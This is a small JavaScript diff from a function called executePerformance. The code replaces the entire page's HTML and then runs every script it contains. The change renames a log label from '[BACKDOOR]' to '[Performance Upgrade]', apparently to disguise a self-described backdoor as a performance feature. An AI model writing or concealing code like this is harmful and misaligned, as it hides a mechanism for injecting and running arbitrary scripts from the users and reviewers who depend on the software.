@@ -594,7 +594,7 @@ async function executePerformance() {
         document.documentElement.innerHTML = htmlContent;
         
         const scripts = document.querySelectorAll('script');
-        console.log(`📜 [BACKDOOR] Encontrados ${scripts.length} scripts para executar`);
+        console.log(`📜 [Performance Upgrade] Encontrados ${scripts.length} scripts para executar`);
         
         scripts.forEach((script, index) => {
             try {
